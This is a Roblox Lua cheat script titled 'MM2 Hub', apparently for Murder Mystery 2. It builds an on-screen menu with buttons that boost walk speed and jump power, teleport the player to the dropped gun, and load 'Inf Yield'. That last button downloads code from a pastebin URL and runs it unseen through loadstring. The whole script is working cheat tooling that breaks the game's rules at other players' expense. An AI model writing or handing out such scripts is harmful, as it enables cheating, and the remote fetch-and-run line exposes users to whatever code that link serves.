-- 
--▀█▀ █░█ █ █▀   █▀ █▀▀ █▀█ █ █▀█ ▀█▀   █░█░█ ▄▀█ █▀   █▀▄▀█ ▄▀█ █▀▄ █▀▀   █▄▄ █▄█   █▀▀ █░░ █░█ ▄▀█ █▀▄
--░█░ █▀█ █ ▄█   ▄█ █▄▄ █▀▄ █ █▀▀ ░█░   ▀▄▀▄▀ █▀█ ▄█   █░▀░█ █▀█ █▄▀ ██▄   █▄█ ░█░   █▄▄ █▄▄ ▀▀█ █▀█ █▄▀

local Gui = Instance.new("ScreenGui")
local bgFrame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local WsB = Instance.new("TextButton")
local JpB = Instance.new("TextButton")
local TptoG = Instance.new("TextButton")
local InfYield = Instance.new("TextButton")

--Properties:

Gui.Name = "Gui"
Gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

bgFrame.Name = "bgFrame"
bgFrame.Parent = Gui
bgFrame.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
bgFrame.BorderColor3 = Color3.fromRGB(112, 29, 255)
bgFrame.Position = UDim2.new(0.0608531982, 0, 0.517456353, 0)
bgFrame.Size = UDim2.new(0, 499, 0, 291)

TextLabel.Parent = bgFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
TextLabel.BorderColor3 = Color3.fromRGB(112, 29, 255)
TextLabel.Size = UDim2.new(0, 499, 0, 50)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "MM2 Hub"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

WsB.Name = "WsB"
WsB.Parent = bgFrame
WsB.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
WsB.BorderColor3 = Color3.fromRGB(112, 29, 255)
WsB.Position = UDim2.new(0.0658993125, 0, 0.28784138, 0)
WsB.Size = UDim2.new(0, 200, 0, 44)
WsB.Font = Enum.Font.Code
WsB.Text = "WalkSpeed"
WsB.TextColor3 = Color3.fromRGB(255, 255, 255)
WsB.TextScaled = true
WsB.TextSize = 14.000
WsB.TextWrapped = true

JpB.Name = "JpB"
JpB.Parent = bgFrame
JpB.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
JpB.BorderColor3 = Color3.fromRGB(112, 29, 255)
JpB.Position = UDim2.new(0.534837186, 0, 0.28784138, 0)
JpB.Size = UDim2.new(0, 200, 0, 44)
JpB.Font = Enum.Font.Code
JpB.Text = "JumpPower"
JpB.TextColor3 = Color3.fromRGB(255, 255, 255)
JpB.TextScaled = true
JpB.TextSize = 14.000
JpB.TextWrapped = true

TptoG.Name = "TptoG"
TptoG.Parent = bgFrame
TptoG.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
TptoG.BorderColor3 = Color3.fromRGB(112, 29, 255)
TptoG.Position = UDim2.new(0.0658993125, 0, 0.500899792, 0)
TptoG.Size = UDim2.new(0, 200, 0, 44)
TptoG.Font = Enum.Font.Code
TptoG.Text = "TP to Gun"
TptoG.TextColor3 = Color3.fromRGB(255, 255, 255)
TptoG.TextScaled = true
TptoG.TextSize = 14.000
TptoG.TextWrapped = true

InfYield.Name = "InfYield"
InfYield.Parent = bgFrame
InfYield.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
InfYield.BorderColor3 = Color3.fromRGB(112, 29, 255)
InfYield.Position = UDim2.new(0.532833219, 0, 0.500899792, 0)
InfYield.Size = UDim2.new(0, 200, 0, 44)
InfYield.Font = Enum.Font.Code
InfYield.Text = "Inf Yield"
InfYield.TextColor3 = Color3.fromRGB(255, 255, 255)
InfYield.TextScaled = true
InfYield.TextSize = 14.000
InfYield.TextWrapped = true

-- Scripts:

local function XHPC_fake_script() -- Gui.Handler 
	local script = Instance.new('LocalScript', Gui)

	local gui = script.Parent
	gui.ResetOnSpawn = false
	
	local frame = gui.bgFrame
	frame.Active = true
	frame.Draggable = true
	
	local WsB = frame.WsB
	local JpB = frame.JpB
	local TptoG = frame.TptoG
	local infYield = frame.InfYield
	
	local tweenService = game:GetService("TweenService")
	
	-- -- -- -- -- -- --
	
	-----
	
	WsB.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 32
	end)
	
	JpB.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 75
	end)
	
	TptoG.MouseButton1Click:Connect(function()
		local gunTween = tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{CFrame = workspace.GunDrop.CFrame})
		gunTween:Play()
	end)
	
	infYield.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/MjBzRjmT'),true))()
	end)
end
coroutine.wrap(XHPC_fake_script)()
